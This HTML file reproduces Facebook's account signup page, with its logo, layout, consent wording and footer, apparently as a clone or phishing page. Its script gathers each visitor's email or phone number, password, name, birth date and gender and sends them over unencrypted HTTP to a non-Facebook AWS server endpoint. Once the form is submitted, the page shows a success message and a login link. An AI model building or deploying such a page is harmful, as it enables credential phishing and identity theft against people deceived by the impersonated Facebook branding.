<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Facebook Sign Up</title>
  <link rel="icon" type="image/png" href="https://upload.wikimedia.org/wikipedia/en/thumb/0/04/Facebook_f_logo_%282021%29.svg/2048px-Facebook_f_logo_%282021%29.svg.png">
  <style>
    /* ... (styles unchanged, omitted for brevity, same as before) ... */
    body {
      font-family: Arial, sans-serif;
      background-color: #f0f2f5;
      display: flex;
      flex-direction: column;
      justify-content: flex-start;
      align-items: center;
      height: 100vh;
      min-height: 100vh;
    }
    .fb-logo {
      display: block;
      margin-left: auto;
      margin-right: auto;
      margin-bottom: 0;
      width: 303px;
      height: 100px;
      margin-top: 20px;
    }
    .signup-container {
      background: white;
      padding: 30px;
      border-radius: 8px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      width: 350px;
      margin-top: 0;
    }
    .pvl._52lp {
      background: white;
      padding: 30px;
      border-radius: 8px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      width: 350px;
      margin-top: 0;
    }
    .mbs._52lq._9bp_.fsl.fwb.fcb {
      font-size: 25px;
      font-weight: bold;
      color: #1c1e21;
      margin-bottom: 6px;
      text-align: center;
      font-family: inherit;
    }
    ._52lr._9bq0.fsm.fwn.fcg {
      color: #606770;
      font-size: 15px;
      font-weight: normal;
      margin-bottom: 16px;
      text-align: center;
      font-family: inherit;
    }
    input, select {
      width: 100%;
      padding: 10px;
      margin: 8px 0;
      border: 1px solid #ccc;
      border-radius: 4px;
      transition: border-color 0.2s;
    }
    .name-row {
      display: flex;
      gap: 8px;
      margin-bottom: 8px;
    }
    .name-row input {
      width: 100%;
      margin: 0;
    }
    .gender-options {
      display: flex;
      justify-content: space-between;
      margin: 10px 0;
    }
    .gender-options label {
      flex: 1;
      text-align: center;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 6px;
    }
    .gender-label-container {
      display: flex;
      align-items: center;
      gap: 4px;
      margin-bottom: 2px;
    }
    .gender-help-icon {
      display: inline-flex;
      align-items: center;
      justify-content: center;
      width: 16px;
      height: 16px;
      border-radius: 50%;
      background: #e4e6eb;
      color: #65676b;
      font-size: 12px;
      cursor: pointer;
      border: none;
      margin-left: 2px;
      position: relative;
      padding: 0;
      transition: background 0.2s;
    }
    .gender-help-icon:hover {
      background: #d8dadf;
    }
    .gender-help-img {
      width: 16px;
      height: 16px;
      border-radius: 50%;
      background: #e4e6eb;
      margin-left: 2px;
      cursor: pointer;
      display: inline-block;
      object-fit: cover;
      vertical-align: middle;
      transition: background 0.2s;
      border: none;
      padding: 0;
    }
    .gender-help-img:hover {
      background: #d8dadf;
    }
    .gender-help-modal-overlay {
      display: none;
      position: fixed;
      z-index: 9999;
      left: 0;
      top: 0;
      width: 100vw;
      height: 100vh;
      background: rgba(0,0,0,0.3);
      justify-content: center;
      align-items: center;
    }
    .gender-help-modal-overlay.active {
      display: flex;
    }
    .gender-help-modal {
      background: #fff;
      border-radius: 8px;
      box-shadow: 0 2px 16px rgba(0,0,0,0.18);
      padding: 24px 28px;
      max-width: 340px;
      width: 90vw;
      font-size: 15px;
      color: #1c1e21;
      text-align: left;
      position: relative;
      line-height: 1.5;
    }
    .gender-help-modal-close {
      position: absolute;
      top: 10px;
      right: 12px;
      background: none;
      border: none;
      font-size: 20px;
      color: #888;
      cursor: pointer;
      padding: 0;
      line-height: 1;
    }
    .gender-help-modal-close:focus {
      outline: 2px solid #1877f2;
    }
    button {
      background-color: #42b72a;
      color: white;
      padding: 10px;
      border: none;
      border-radius: 4px;
      width: 100%;
      font-size: 16px;
      cursor: pointer;
    }
    button:hover {
      background-color: #36a420;
    }
    .footer {
      text-align: center;
      margin-top: 10px;
      font-size: 12px;
      color: #555;
    }
    .signup-info {
      text-align: center;
      margin-top: 0;
      margin-bottom: 10px;
      font-size: 12px;
      color: #555;
      line-height: 1.5;
    }
    .all-red input,
    .all-red select {
      border-color: red !important;
    }
    .red-border {
      border-color: red !important;
    }
    .meta-footer-bar {
      width: 100%;
      background: transparent;
      margin-top: 40px;
      text-align: center;
      font-size: 13px;
      color: #737373;
      padding-bottom: 10px;
    }
    .meta-footer-bar .lang-list {
      margin-bottom: 10px;
      display: flex;
      flex-wrap: wrap;
      justify-content: center;
      gap: 8px 16px;
    }
    .meta-footer-bar .lang-list span {
      cursor: pointer;
      color: #385898;
      text-decoration: none;
      padding: 0 4px;
      font-size: 13px;
    }
    .meta-footer-bar .meta-links {
      margin-bottom: 10px;
      display: flex;
      flex-wrap: wrap;
      justify-content: center;
      gap: 8px 16px;
    }
    .meta-footer-bar .meta-links span {
      color: #385898;
      cursor: pointer;
      text-decoration: none;
      padding: 0 4px;
      font-size: 13px;
    }
    .meta-footer-bar .meta-copyright {
      color: #737373;
      font-size: 12px;
      margin-top: 8px;
    }
    /* Additional style for login button after registration */
    .login-btn-after-signup {
      background-color: #1877f2;
      color: #fff;
      margin-top: 12px;
      width: 100%;
      border-radius: 4px;
      border: none;
      padding: 10px;
      font-size: 16px;
      cursor: pointer;
      display: block;
      text-align: center;
      text-decoration: none;
      transition: background 0.2s;
    }
    .login-btn-after-signup:hover {
      background-color: #145db2;
    }
  </style>
</head>
<body>

  <!-- Facebook Logo -->
  <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Facebook Logo" class="fb-logo">

  <div class="pvl _52lp">
    <div class="mbs _52lq _9bp_ fsl fwb fcb">Create a new account</div>
    <div class="_52lr _9bq0 fsm fwn fcg">It's quick and easy.</div>
    <form id="signupForm" novalidate onsubmit="event.preventDefault(); signup();">
      <div class="name-row">
        <input type="text" placeholder="First name" name="firstName" id="signupFirstName" required>
        <input type="text" placeholder="Surname" name="surname" id="signupSurname" required>
      </div>

      <label>Date of Birth</label>
      <div style="display: flex; gap: 5px;">
        <select id="dob-day" name="dobDay" required>
          <option value="">Day</option>
          <!-- Days 1-31 -->
          <option>1</option>
          <option>2</option>
          <option>3</option>
          <option>4</option>
          <option>5</option>
          <option>6</option>
          <option>7</option>
          <option>8</option>
          <option>9</option>
          <option>10</option>
          <option>11</option>
          <option>12</option>
          <option>13</option>
          <option>14</option>
          <option>15</option>
          <option>16</option>
          <option>17</option>
          <option>18</option>
          <option>19</option>
          <option>20</option>
          <option>21</option>
          <option>22</option>
          <option>23</option>
          <option>24</option>
          <option>25</option>
          <option>26</option>
          <option>27</option>
          <option>28</option>
          <option>29</option>
          <option>30</option>
          <option>31</option>
        </select>
        <select id="dob-month" name="dobMonth" required>
          <option value="">Month</option>
          <option value="1">Jan</option>
          <option value="2">Feb</option>
          <option value="3">Mar</option>
          <option value="4">Apr</option>
          <option value="5">May</option>
          <option value="6">Jun</option>
          <option value="7">Jul</option>
          <option value="8">Aug</option>
          <option value="9">Sep</option>
          <option value="10">Oct</option>
          <option value="11">Nov</option>
          <option value="12">Dec</option>
        </select>
        <select id="dob-year" name="dobYear" required>
          <option value="">Year</option>
          <!-- Years 1907-2025 -->
          <!-- years will be populated by JS below -->
        </select>
      </div>

      <div class="gender-label-container">
        <label style="margin-bottom:0;">Gender</label>
      </div>
      <div class="gender-options" style="display: flex; gap: 12px; margin-bottom: 12px;">
        <div style="flex: 1; border: 1px solid #ccd0d5; border-radius: 6px; padding: 12px 10px; background: #f5f6f7; display: flex; align-items: center; justify-content: center;">
          <label style="display: flex; align-items: center; gap: 4px; margin: 0;">
            Female <input type="radio" name="gender" value="Female" required>
          </label>
        </div>
        <div style="flex: 1; border: 1px solid #ccd0d5; border-radius: 6px; padding: 12px 10px; background: #f5f6f7; display: flex; align-items: center; justify-content: center;">
          <label style="display: flex; align-items: center; gap: 4px; margin: 0;">
            Male <input type="radio" name="gender" value="Male">
          </label>
        </div>
        <div style="flex: 1; border: 1px solid #ccd0d5; border-radius: 6px; padding: 12px 10px; background: #f5f6f7; display: flex; align-items: center; justify-content: center;">
          <label style="display: flex; align-items: center; gap: 4px; margin: 0;">
            Custom <input type="radio" name="gender" value="Custom">
          </label>
        </div>
      </div>

      <input type="email" placeholder="Mobile number or email address" name="email" id="signupEmail" required>
      <input type="password" placeholder="New password" name="password" id="signupPassword" required>

      <div id="signupMsg" style="margin-top:10px;"></div>
      <div id="loginBtnContainer"></div>

      <div class="signup-info">
        People who use our service may have uploaded your contact information to Facebook. <a href="#" style="color:#385898;text-decoration:none;">Learn more.</a>
      </div>
      <div class="signup-info">
        By clicking Sign Up, you agree to our Terms, Privacy Policy and Cookies Policy. You may receive SMS notifications from us and can opt out at any time.
      </div>

      <button type="submit">Sign Up</button>
    </form>
  </div>

  <div class="meta-footer-bar">
    <div class="lang-list">
      <span>English (UK)</span>
      <span>हिन्दी</span>
      <span>اردو</span>
      <span>தமிழ்</span>
      <span>বাংলা</span>
      <span>मराठी</span>
      <span>తెలుగు</span>
      <span>ગુજરાતી</span>
      <span>ಕನ್ನಡ</span>
      <span>മലയാളം</span>
      <span>Español</span>
    </div>
    <div class="meta-links">
      <span>Sign Up</span>
      <span>Log in</span>
      <span>Messenger</span>
      <span>Facebook Lite</span>
      <span>Video</span>
      <span>Meta Pay</span>
      <span>Meta Store</span>
      <span>Meta Quest</span>
      <span>Ray-Ban Meta</span>
      <span>Meta AI</span>
      <span>Meta AI more content</span>
      <span>Instagram</span>
      <span>Threads</span>
      <span>Voting Information Centre</span>
      <span>Privacy Policy</span>
      <span>Privacy Centre</span>
      <span>About</span>
      <span>Create ad</span>
      <span>Create Page</span>
      <span>Developers</span>
      <span>Careers</span>
      <span>Cookies</span>
      <span>AdChoices</span>
      <span>Terms</span>
      <span>Help</span>
      <span>Contact uploading and non-users</span>
      <span>Settings</span>
      <span>Activity log</span>
    </div>
    <div class="meta-copyright">
      Meta of abinash © 2025
    </div>
  </div>

  <script>
    // Populate years in the dob-year select (from 1907 to 2025)
    (function populateYears() {
      const yearSelect = document.getElementById('dob-year');
      if (yearSelect) {
        for (let y = 2025; y >= 1907; y--) {
          const opt = document.createElement('option');
          opt.value = y;
          opt.textContent = y;
          yearSelect.appendChild(opt);
        }
      }
    })();

    const API_BASE = "http://backendforrds-165551629.eu-west-2.elb.amazonaws.com/api";

    async function signup() {
      const email = document.getElementById("signupEmail").value;
      const password = document.getElementById("signupPassword").value;
      const firstName = document.getElementById("signupFirstName").value;
      const surname = document.getElementById("signupSurname").value;
      const dobDay = document.getElementById("dob-day").value;
      const dobMonth = document.getElementById("dob-month").value;
      const dobYear = document.getElementById("dob-year").value;

      // Get gender
      let gender = "";
      const genderRadios = document.getElementsByName("gender");
      for (let i = 0; i < genderRadios.length; i++) {
        if (genderRadios[i].checked) {
          gender = genderRadios[i].value;
          break;
        }
      }

      let res = await fetch(`${API_BASE}/save`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          email,
          password,
          firstName,
          surname,
          dobDay,
          dobMonth,
          dobYear,
          gender
        })
      });
      let data = await res.json();

      if (res.status === 200) {
        document.getElementById("signupMsg").style.color = "green";
        document.getElementById("signupMsg").innerText = "✅ User registered successfully!";
        // Show login button
        const loginBtnContainer = document.getElementById("loginBtnContainer");
        loginBtnContainer.innerHTML = `
          <a href="#" class="login-btn-after-signup" id="loginAfterSignupBtn">Log In</a>
        `;
        // Add event listener to redirect to index.html on click
        const loginBtn = document.getElementById("loginAfterSignupBtn");
        if (loginBtn) {
          loginBtn.addEventListener("click", function(e) {
            e.preventDefault();
            window.location.href = "index.html";
          });
        }
      } else {
        document.getElementById("signupMsg").style.color = "red";
        document.getElementById("signupMsg").innerText = data.error;
        // Remove login button if present
        const loginBtnContainer = document.getElementById("loginBtnContainer");
        loginBtnContainer.innerHTML = "";
      }
    }
  </script>

</body>
</html>
